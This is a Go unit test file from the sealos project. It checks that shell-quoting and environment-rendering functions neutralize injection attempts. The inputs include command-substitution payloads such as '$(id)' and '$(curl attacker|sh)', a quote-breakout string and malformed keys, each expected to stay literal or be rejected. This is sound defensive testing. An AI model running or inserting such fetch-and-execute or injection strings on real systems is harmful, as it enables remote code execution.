/*
Copyright 2026 sealos.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package strings

import "testing"

func TestShellQuote(t *testing.T) {
	tests := []struct {
		name string
		in   string
		want string
	}{
		{name: "empty", in: "", want: "''"},
		{name: "plain", in: "hello", want: "'hello'"},
		{name: "space", in: "hello world", want: "'hello world'"},
		{name: "single quote", in: "a'b'c", want: `'a'\''b'\''c'`},
		{name: "command substitution", in: "$(id)", want: "'$(id)'"},
		{name: "backtick", in: "`id`", want: "'`id`'"},
		{name: "newline", in: "a\nb", want: "'a\nb'"},
		{name: "leading dash", in: "-rf", want: "'-rf'"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := ShellQuote(tt.in); got != tt.want {
				t.Fatalf("ShellQuote(%q) = %q, want %q", tt.in, got, tt.want)
			}
		})
	}
}

func TestRenderShellWithEnv(t *testing.T) {
	tests := []struct {
		name    string
		shell   string
		envs    map[string]string
		want    string
		wantErr bool
	}{
		{
			name:  "no envs",
			shell: "echo hi",
			envs:  nil,
			want:  "echo hi",
		},
		{
			name:  "sorted keys",
			shell: "echo hi",
			envs:  map[string]string{"B": "two words", "A": "1"},
			want:  "export A='1'; export B='two words'; echo hi",
		},
		{
			name:  "quote breakout stays literal",
			shell: "true",
			envs:  map[string]string{"X": "foo'; id; '"},
			want:  `export X='foo'\''; id; '\'''; true`,
		},
		{
			name:  "command substitution stays literal",
			shell: "true",
			envs:  map[string]string{"X": "$(curl attacker|sh)"},
			want:  "export X='$(curl attacker|sh)'; true",
		},
		{
			name:  "backtick stays literal",
			shell: "true",
			envs:  map[string]string{"X": "`id`"},
			want:  "export X='`id`'; true",
		},
		{
			name:  "newline stays inside quotes",
			shell: "true",
			envs:  map[string]string{"X": "a\nb"},
			want:  "export X='a\nb'; true",
		},
		{
			name:    "invalid key is rejected",
			shell:   "true",
			envs:    map[string]string{"A;id": "x"},
			wantErr: true,
		},
		{
			name:    "empty key is rejected",
			shell:   "true",
			envs:    map[string]string{"": "x"},
			wantErr: true,
		},
		{
			name:    "dash key is rejected",
			shell:   "true",
			envs:    map[string]string{"A-B": "x"},
			wantErr: true,
		},
		{
			name:    "NUL value is rejected",
			shell:   "true",
			envs:    map[string]string{"A": "x\x00y"},
			wantErr: true,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := RenderShellWithEnv(tt.shell, tt.envs)
			if tt.wantErr {
				if err == nil {
					t.Fatalf("expected error, got %q", got)
				}
				return
			}
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if got != tt.want {
				t.Fatalf("RenderShellWithEnv() = %q, want %q", got, tt.want)
			}
		})
	}
}
